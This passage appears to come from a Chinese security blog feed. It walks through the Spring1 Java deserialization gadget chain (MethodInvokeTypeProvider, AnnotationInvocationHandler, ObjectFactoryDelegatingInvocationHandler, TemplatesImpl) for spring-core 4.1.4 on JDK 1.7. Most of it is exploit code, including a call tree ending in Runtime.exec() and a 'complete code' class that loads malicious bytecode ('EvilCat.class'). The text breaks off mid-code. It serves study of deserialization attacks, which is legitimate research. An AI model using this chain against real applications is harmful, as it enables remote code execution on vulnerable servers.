class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Object obj, <span class="hljs-keyword">final</span> String fieldName, <span class="hljs-keyword">final</span> Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">final</span> <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> getField(obj.getClass(), fieldName);<br>        field.set(obj, value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Field <span class="hljs-title function_">getField</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Class&lt;?&gt; clazz, <span class="hljs-keyword">final</span> String fieldName)</span> &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            field = clazz.getDeclaredField(fieldName);<br>            field.setAccessible(<span class="hljs-literal">true</span>);<br>        &#125;<br>        <span class="hljs-keyword">catch</span> (NoSuchFieldException ex) &#123;<br>            <span class="hljs-keyword">if</span> (clazz.getSuperclass() != <span class="hljs-literal">null</span>)<br>                field = getField(clazz.getSuperclass(), fieldName);<br>        &#125;<br>        <span class="hljs-keyword">return</span> field;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="0x06-链接"><a href="#0x06-链接" class="headerlink" title="0x06 链接"></a>0x06 链接</h2><p><a href="https://su18.org/post/ysoserial-su18-3/#spring2">https://su18.org/post/ysoserial-su18-3/#spring2</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>java-gadget</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>spring1-gadget</title>
    <link href="/2023/12/14/spring1-gadget/"/>
    <url>/2023/12/14/spring1-gadget/</url>
    
    <content type="html"><![CDATA[<ol><li>依赖版本</li></ol><p>spring-core : 4.1.4.RELEASE<br>spring-beans : 4.1.4.RELEASE<br>jdk 1.7</p><h2 id="0x01-动态代理-Proxy-java"><a href="#0x01-动态代理-Proxy-java" class="headerlink" title="0x01 动态代理 Proxy.java"></a>0x01 动态代理 Proxy.java</h2><p>JDK提供的一个Proxy.newProxyInstance()创建了一个Hello接口对象。这种没有实现类但是在运行期动态创建了一个接口对象的方式，我们称为动态代码。JDK提供的动态创建接口对象的方式，就叫动态代理。</p><p>java&#x2F;lang&#x2F;reflect&#x2F;Proxy.java</p><p><img src="1700936771829-9603e802-5f80-4c2a-a549-6a495be25c56.png" alt="img"></p><p>三个参数分别是ClassLoader, 要代理的interfaces，和调用的invocationHandler。</p><p>代理后，使用interfaces里面的方法时，会自动调用传入invocationHandler.invoke()方法。相当于在不动源代码的情况下，通过invocationHandler.invoke对原方法的增强。</p><p>知道这点就够了。</p><h2 id="0x02-AnnotationInvocationHandler-java"><a href="#0x02-AnnotationInvocationHandler-java" class="headerlink" title="0x02 AnnotationInvocationHandler.java"></a>0x02 AnnotationInvocationHandler.java</h2><p>sun&#x2F;reflect&#x2F;annotation&#x2F;AnnotationInvocationHandler.java</p><p>通过这个AnnotationInvocationHandler.java 动态代理结合interfaces，然后在反射构造函数传入map，map里面包含interfaces里面的方法名，和一个对象(<strong>map(“方法名”，Object)</strong>)，就可以在invocationHandler.invoke()调用时放回这个<strong>Object，</strong>这就是Spring1这条链的精髓所在<strong>。</strong></p><p><img src="1700937893410-8dbc5a8b-7b81-488e-a7fa-7c4c45914c1e.png" alt="img"></p><p><img src="1700937914135-815c9d15-7551-4c86-afac-96e1bc946ce9.png" alt="img"></p><p><img src="1700937934220-d58a68a8-ae74-468a-9559-d6af8b456278.png" alt="img"></p><p>invoke</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">invoke</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span> &#123;<br>       <span class="hljs-type">String</span> <span class="hljs-variable">member</span> <span class="hljs-operator">=</span> method.getName();<br>       Class&lt;?&gt;[] paramTypes = method.getParameterTypes();<br><br>       <span class="hljs-comment">// Handle Object and Annotation methods</span><br>       <span class="hljs-keyword">if</span> (member.equals(<span class="hljs-string">&quot;equals&quot;</span>) &amp;&amp; paramTypes.length == <span class="hljs-number">1</span> &amp;&amp;<br>           paramTypes[<span class="hljs-number">0</span>] == Object.class)<br>           <span class="hljs-keyword">return</span> equalsImpl(args[<span class="hljs-number">0</span>]);<br>       <span class="hljs-keyword">if</span> (paramTypes.length != <span class="hljs-number">0</span>)<br>           <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AssertionError</span>(<span class="hljs-string">&quot;Too many parameters for an annotation method&quot;</span>);<br><br>       <span class="hljs-keyword">switch</span>(member) &#123;<br>       <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;toString&quot;</span>:<br>           <span class="hljs-keyword">return</span> toStringImpl();<br>       <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;hashCode&quot;</span>:<br>           <span class="hljs-keyword">return</span> hashCodeImpl();<br>       <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;annotationType&quot;</span>:<br>           <span class="hljs-keyword">return</span> type;<br>       &#125;<br><br>       <span class="hljs-comment">// Handle annotation member accessors</span><br>       <span class="hljs-type">Object</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> memberValues.get(member);<br><br>       <span class="hljs-keyword">if</span> (result == <span class="hljs-literal">null</span>)<br>           <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IncompleteAnnotationException</span>(type, member);<br><br>       <span class="hljs-keyword">if</span> (result <span class="hljs-keyword">instanceof</span> ExceptionProxy)<br>           <span class="hljs-keyword">throw</span> ((ExceptionProxy) result).generateException();<br><br>       <span class="hljs-keyword">if</span> (result.getClass().isArray() &amp;&amp; Array.getLength(result) != <span class="hljs-number">0</span>)<br>           result = cloneArray(result);<br><br>       <span class="hljs-keyword">return</span> result;<br>   &#125;<br></code></pre></td></tr></table></figure><p>只能说是无敌。</p><h2 id="0x03-MethodInvokeTypeProvider"><a href="#0x03-MethodInvokeTypeProvider" class="headerlink" title="0x03 MethodInvokeTypeProvider"></a>0x03 MethodInvokeTypeProvider</h2><p>org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider.java</p><p>接下来我们从反序列触发点开始分析。</p><p>readObject()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream inputStream)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>inputStream.defaultReadObject();<br><span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> ReflectionUtils.findMethod(<span class="hljs-built_in">this</span>.provider.getType().getClass(), <span class="hljs-built_in">this</span>.methodName);<br><span class="hljs-built_in">this</span>.result = ReflectionUtils.invokeMethod(method, <span class="hljs-built_in">this</span>.provider.getType());<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="1700938325145-d7d5aee2-c3cf-4343-b7db-dfa471b73006.png" alt="img"></p><p>先在class找对应的方法，然后使用这个方法。调用的方法只能是无参方法。很容易就想到TemplatesImpl.newTransformer()。也就是办法把methodName改为newTransformer，provider.getType().getClass()要得到TemplatesI。</p><h2 id="0x04-TypeProvider"><a href="#0x04-TypeProvider" class="headerlink" title="0x04 TypeProvider"></a>0x04 TypeProvider</h2><p>org.springframework.core.SerializableTypeWrapper$TypeProvider</p><p><img src="1700938736196-62c5cd98-c206-43cb-9c64-00bb1622fd67.png" alt="img"></p><p>TypeProvider这个接口刚好有这个方法，可以想到通过AnnotationInvocationHandler.invoke来放回TemplatesI。</p><p>那么就是通过动态代理代理TypeProvider接口，invocationHandler传入AnnotationInvocationHandler，然后通过反射调用构造函数传入map(“geType”，TemplatesI)，在调用接口任意方法就能返回TemplatesI。</p><p>对应的实现代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java">Class&lt;?&gt;       c           = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>Constructor&lt;?&gt; constructor = c.getDeclaredConstructors()[<span class="hljs-number">0</span>];<br>constructor.setAccessible(<span class="hljs-literal">true</span>);<br><br><br><br><span class="hljs-comment">// 接下来代理  TypeProvider 的 getType() 方法，使其返回我们创建的 typeTemplateProxy 代理类</span><br>HashMap&lt;String, Object&gt; map2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>map2.put(<span class="hljs-string">&quot;getType&quot;</span>, templates);<br><br><span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">newInvocationHandler</span> <span class="hljs-operator">=</span> (InvocationHandler) constructor.newInstance(Target.class, map2);<br><br>Class&lt;?&gt; typeProviderClass = Class.forName(<span class="hljs-string">&quot;org.springframework.core.SerializableTypeWrapper$TypeProvider&quot;</span>);<br><span class="hljs-comment">// 使用 AnnotationInvocationHandler 动态代理 TypeProvider 的 getType 方法，使其返回 typeTemplateProxy</span><br><span class="hljs-type">Object</span> <span class="hljs-variable">typeProviderProxy</span> <span class="hljs-operator">=</span> Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;typeProviderClass&#125;, newInvocationHandler);<br><br><br><span class="hljs-comment">// 初始化 MethodInvokeTypeProvider</span><br>Class&lt;?&gt;       clazz2 = Class.forName(<span class="hljs-string">&quot;org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider&quot;</span>);<br>Constructor&lt;?&gt; cons   = clazz2.getDeclaredConstructors()[<span class="hljs-number">0</span>];<br>cons.setAccessible(<span class="hljs-literal">true</span>);<br>cons.newInstance(typeProviderProxy,TemplatesImpl.class.getMethod(<span class="hljs-string">&quot;newTransformer&quot;</span>), <span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure><p>调试</p><p><img src="1700940037452-042b5e6e-7cd4-45dd-b0bc-320413010234.png" alt="img"></p><p>可以发现成功返回了TemplatesImpl。</p><p>但是为什么没有加载成功defindclass了。</p><p><img src="1700940133796-e76ec26b-1260-4974-9989-eb495f1ccc93.png" alt="img"></p><p>这里报错，抛出了类型转换错误，TemplatesImpl不能转化为Type类型。那怎么办了？</p><h2 id="0x05-ObjectFactoryDelegatingInvocationHandler"><a href="#0x05-ObjectFactoryDelegatingInvocationHandler" class="headerlink" title="0x05 ObjectFactoryDelegatingInvocationHandler"></a>0x05 ObjectFactoryDelegatingInvocationHandler</h2><p>springframework里面有一个InvocationHandler类。</p><p>org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler</p><p>构造函数</p><p><img src="1700941320414-0f3be55f-e87a-4f1e-8409-882c75dd6087.png" alt="img"></p><p>objectFactory可控</p><p>invoke方法</p><p><img src="1700941969065-26eddd30-708a-45ff-900b-a3c9ec5bfa21.png" alt="img"></p><p>所以要找一个接口里面有toString或者getObject方法（理论上）。</p><p>这条链子找的是getObject。</p><p><img src="1700942103288-1f40556d-c9ad-47d5-8750-e6bbd8a6e168.png" alt="img"></p><p>然后在ObjectFactoryDelegatingInvocationHandler.invoke，可以结合AnnotationInvocationHandler返回TemplatesImpl。</p><p>对应代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java">        Class&lt;?&gt;       c           = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; constructor = c.getDeclaredConstructors()[<span class="hljs-number">0</span>];<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map.put(<span class="hljs-string">&quot;getObject&quot;</span>, templates);<br><br>        <span class="hljs-comment">// 使用动态代理初始化 AnnotationInvocationHandler</span><br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">invocationHandler</span> <span class="hljs-operator">=</span> (InvocationHandler) constructor.newInstance(Target.class, map);<br>        ObjectFactory&lt;?&gt; factory = (ObjectFactory&lt;?&gt;) Proxy.newProxyInstance(<br>                ClassLoader.getSystemClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;ObjectFactory.class&#125;, invocationHandler);<br><br>        Class&lt;?&gt;       clazz          = Class.forName(<span class="hljs-string">&quot;org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; ofdConstructor = clazz.getDeclaredConstructors()[<span class="hljs-number">0</span>];<br>        ofdConstructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-comment">// 使用动态代理出的 ObjectFactory 类实例化 ObjectFactoryDelegatingInvocationHandler</span><br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">ofdHandler</span> <span class="hljs-operator">=</span> (InvocationHandler) ofdConstructor.newInstance(factory);<br><br><br>        Class&lt;?&gt; typeProviderClass = Class.forName(<span class="hljs-string">&quot;org.springframework.core.SerializableTypeWrapper$TypeProvider&quot;</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">typeProviderProxy</span> <span class="hljs-operator">=</span> Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;typeProviderClass&#125;, ofdHandler);<br><span class="hljs-comment">//        System.out.println(typeProviderProxy);</span><br><br><br>        <span class="hljs-comment">// 初始化 MethodInvokeTypeProvider</span><br>        Class&lt;?&gt;       clazz2 = Class.forName(<span class="hljs-string">&quot;org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider&quot;</span>);<br>        Constructor&lt;?&gt; cons   = clazz2.getDeclaredConstructors()[<span class="hljs-number">0</span>];<br>        cons.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-comment">// 由于 MethodInvokeTypeProvider 初始化时会立即调用  ReflectionUtils.invokeMethod(method, provider.getType())</span><br>        <span class="hljs-comment">// 所以初始化时我们随便给个 Method，methodName 我们使用反射写进去</span><br>        cons.newInstance(typeProviderProxy,TemplatesImpl.class.getMethod(<span class="hljs-string">&quot;newTransformer&quot;</span>), <span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure><p>调试</p><p><img src="1700943894667-6a99d444-3ba0-464d-9bae-6178a334bc7e.png" alt="img"></p><p>可以看见按照预期，接下来应该进入AnnotationInvocationHandler,然后返回TemplatesImpl</p><p>但是还是报错了</p><p><img src="1700944234380-2b8427d3-26f4-41d7-8a78-cdaa1411873f.png" alt="img"></p><p><img src="1700951662980-897b0e97-a3f1-440f-9b29-993fa813c984.png" alt="img"></p><p>显示反射调用的权限问题。</p><p><img src="1700950593525-3c90ee07-e632-4051-87c5-9bff6d50aa22.png" alt="img"></p><p>这个类不能直接实列化。</p><p>所以需要返回这个对象，这里很自然就想起AnnotationInvocationHandler在代理一遍。</p><p>不得不说，世上无难事，有事找大哥，大哥们的花活太强了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Type</span> <span class="hljs-variable">typeTemplateProxy</span> <span class="hljs-operator">=</span> (Type) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Type.class, Templates.class&#125;, ofdHandler);<br>HashMap&lt;Object, Object&gt; map1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>map1.put(<span class="hljs-string">&quot;getType&quot;</span>, typeTemplateProxy);<br><br><span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">newInvocationHandler</span> <span class="hljs-operator">=</span> (InvocationHandler) constructor.newInstance(Target.class, map1);<br><br><br>Class&lt;?&gt; typeProviderClass = Class.forName(<span class="hljs-string">&quot;org.springframework.core.SerializableTypeWrapper$TypeProvider&quot;</span>);<br><span class="hljs-type">Object</span> <span class="hljs-variable">typeProviderProxy</span> <span class="hljs-operator">=</span> Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;typeProviderClass&#125;, newInvocationHandler);<br></code></pre></td></tr></table></figure><p><img src="1700951451894-49094428-e93c-4f44-b5f0-8ed8aaa045d2.png" alt="img"></p><p>这样在this.provider.getType()返回一个SerializableTypeWrapper$TypeProvider对象。</p><p>但是需要的是TemplatesImpl类。</p><p>大哥这里是这样处理的，只能说艺术。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">        <span class="hljs-comment">// ObjectFactoryDelegatingInvocationHandler 本身就是个 InvocationHandler</span><br>        <span class="hljs-comment">// 使用它来代理一个类，这样在这个类调用时将会触发 ObjectFactoryDelegatingInvocationHandler 的 invoke 方法</span><br>        <span class="hljs-comment">// 我们用它代理一个既是 Type 类型又是 Templates(TemplatesImpl 父类) 类型的类</span><br>        <span class="hljs-comment">// 这样这个代理类同时拥有两个类的方法，既能被强转为 TypeProvider.getType() 的返回值，又可以在其中找到 newTransformer 方法</span><br><span class="hljs-comment">//        Type typeTemplateProxy = (Type) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),</span><br><span class="hljs-comment">//                new Class[]&#123;Type.class, Templates.class&#125;, ofdHandler);</span><br>        <span class="hljs-type">Type</span> <span class="hljs-variable">typeTemplateProxy</span> <span class="hljs-operator">=</span> (Type) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Type.class, Templates.class&#125;, ofdHandler);<br></code></pre></td></tr></table></figure><p>这样既满足SerializableTypeWrapper$TypeProvider.getType()，又能找到newTransformer方法，完成触发。</p><h2 id="0x06-完整利用链"><a href="#0x06-完整利用链" class="headerlink" title="0x06 完整利用链"></a>0x06 完整利用链</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java">ObjectInputStream.readObject()<br>   SerializableTypeWrapper.MethodInvokeTypeProvider.readObject()<br>      SerializableTypeWrapper.TypeProvider(Proxy).getType()<br>         AnnotationInvocationHandler.invoke()<br>            HashMap.get()<br>      ReflectionUtils.findMethod()<br>      SerializableTypeWrapper.TypeProvider(Proxy).getType()<br>         AnnotationInvocationHandler.invoke()<br>            HashMap.get()<br>      ReflectionUtils.invokeMethod()<br>         Method.invoke()<br>            Templates(Proxy).newTransformer()<br>               AutowireUtils.ObjectFactoryDelegatingInvocationHandler.invoke()<br>                  ObjectFactory(Proxy).getObject()<br>                     AnnotationInvocationHandler.invoke()<br>                        HashMap.get()<br>                  Method.invoke()<br>                     TemplatesImpl.newTransformer()<br>                        TemplatesImpl.getTransletInstance()<br>                           TemplatesImpl.defineTransletClasses()<br>                              TemplatesImpl.TransletClassLoader.defineClass()<br>                                 Pwner*(Javassist-generated).&lt;<span class="hljs-keyword">static</span> init&gt;<br>                                    Runtime.exec()<br></code></pre></td></tr></table></figure><p>完整代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.tmp.cc;<br><br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> org.springframework.beans.factory.ObjectFactory;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><span class="hljs-keyword">import</span> java.lang.reflect.*;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.net.URLConnection;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">spring1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><span class="hljs-comment">//        byte[] classBytes = loadRemoteClass(&quot;http://127.0.0.1:8888/cb.class&quot;);</span><br><br>        <span class="hljs-type">byte</span>[] classBytes = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;EvilCat.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] targetByteCodes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;classBytes&#125;;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> TemplatesImpl.class.newInstance();<br>        setFieldValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, targetByteCodes);<br>        setFieldValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;name&quot;</span>);<br>        setFieldValue(templates, <span class="hljs-string">&quot;_class&quot;</span>, <span class="hljs-literal">null</span>);<br><span class="hljs-comment">//        setFieldValue(templates, &quot;_tfactory&quot;, new TransformerFactoryImpl());</span><br><br>        <span class="hljs-comment">// 使用 AnnotationInvocationHandler 动态代理</span><br>        Class&lt;?&gt;       c           = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; constructor = c.getDeclaredConstructors()[<span class="hljs-number">0</span>];<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br><br>        HashMap&lt;String, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map.put(<span class="hljs-string">&quot;getObject&quot;</span>, templates);<br><br>        <span class="hljs-comment">// 使用动态代理初始化 AnnotationInvocationHandler</span><br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">invocationHandler</span> <span class="hljs-operator">=</span> (InvocationHandler) constructor.newInstance(Target.class, map);<br><br>        <span class="hljs-comment">// 使用 AnnotationInvocationHandler 动态代理 ObjectFactory 的 getObject 方法，使其返回 TemplatesImpl</span><br>        ObjectFactory&lt;?&gt; factory = (ObjectFactory&lt;?&gt;) Proxy.newProxyInstance(<br>                ClassLoader.getSystemClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;ObjectFactory.class&#125;, invocationHandler);<br><br>        <span class="hljs-comment">// ObjectFactoryDelegatingInvocationHandler 的 invoke 方法触发 ObjectFactory 的 getObject</span><br>        <span class="hljs-comment">// 并且会调用 method.invoke(返回值,args)</span><br>        <span class="hljs-comment">// 此时返回值被我们使用动态代理改为了 TemplatesImpl</span><br>        <span class="hljs-comment">// 接下来需要 method 是 newTransformer()，就可以触发调用链了</span><br>        Class&lt;?&gt;       clazz          = Class.forName(<span class="hljs-string">&quot;org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; ofdConstructor = clazz.getDeclaredConstructors()[<span class="hljs-number">0</span>];<br>        ofdConstructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-comment">// 使用动态代理出的 ObjectFactory 类实例化 ObjectFactoryDelegatingInvocationHandler</span><br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">ofdHandler</span> <span class="hljs-operator">=</span> (InvocationHandler) ofdConstructor.newInstance(factory);<br><br>        <span class="hljs-comment">// ObjectFactoryDelegatingInvocationHandler 本身就是个 InvocationHandler</span><br>        <span class="hljs-comment">// 使用它来代理一个类，这样在这个类调用时将会触发 ObjectFactoryDelegatingInvocationHandler 的 invoke 方法</span><br>        <span class="hljs-comment">// 我们用它代理一个既是 Type 类型又是 